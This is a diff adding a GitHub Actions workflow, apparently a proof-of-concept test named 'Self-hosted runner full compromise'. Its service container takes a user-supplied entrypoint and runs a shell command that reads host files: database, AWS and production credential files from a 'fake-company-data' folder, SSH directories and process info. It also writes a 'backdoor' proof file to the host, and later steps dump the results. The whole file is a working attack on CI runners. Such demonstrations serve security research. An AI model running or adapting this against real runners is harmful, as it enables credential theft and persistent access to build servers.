@@ -1,0 +1,37 @@
+name: "Test 15: Self-hosted runner full compromise"
+on:
+  workflow_dispatch:
+    inputs:
+      entrypoint:
+        description: "Entrypoint"
+        default: "/bin/sh"
+env:
+  PRODUCTION_DB_PASSWORD: ${{ secrets.PRODUCTION_DB_PASSWORD }}
+jobs:
+  self-hosted-attack:
+    runs-on: [self-hosted, test-runner]
+    name: "Self-hosted runner attack"
+    services:
+      attacker:
+        image: alpine:3.19
+        entrypoint: ${{ github.event.inputs.entrypoint }}
+        command: -c "echo === SELF-HOSTED RUNNER COMPROMISE ===; echo; echo === 1. HOST IDENTITY ===; cat /host/etc/hostname 2>&1; uname -a 2>&1; echo; echo === 2. REAL FILES ON SERVER ===; ls -la /host/tmp/fake-company-data/ 2>&1; echo; echo === 3. DATABASE CREDENTIALS ===; cat /host/tmp/fake-company-data/database.env 2>&1; echo; echo === 4. AWS CREDENTIALS ===; cat /host/tmp/fake-company-data/aws-credentials.json 2>&1; echo; echo === 5. PRODUCTION SECRETS ===; cat /host/tmp/fake-company-data/.env.production 2>&1; echo; echo === 6. SSH PERSISTENCE ===; ls -la /host/home/ubuntu/.ssh/ 2>&1; echo; echo === 7. WRITE PERSISTENCE TEST ===; echo ATTACKER_BACKDOOR > /host/tmp/backdoor_proof.txt 2>&1; echo wrote backdoor_proof.txt; echo; echo === 8. REAL USER FILES ===; ls /host/home/ubuntu/ 2>&1 | head -10; echo; echo === 9. RUNNING PROCESSES ===; cat /host/proc/1/cmdline 2>&1 | tr '\0' ' '; echo; echo; echo === COMPROMISE COMPLETE ===; sleep 60"
+    steps:
+      - name: Wait
+        run: sleep 15
+
+      - name: Attack results
+        run: |
+          for CID in $(docker ps -aq); do
+            echo "=== COMPROMISE RESULTS ==="
+            docker logs "$CID" 2>&1
+            echo ""
+            echo "=== CONTAINER CONFIG ==="
+            docker inspect "$CID" --format 'Privileged={{.HostConfig.Privileged}} Binds={{.HostConfig.Binds}}' 2>&1
+          done
+
+      - name: Verify persistence
+        run: |
+          echo "=== PERSISTENCE CHECK ==="
+          echo "File written by attacker container:"
+          cat /tmp/backdoor_proof.txt 2>&1
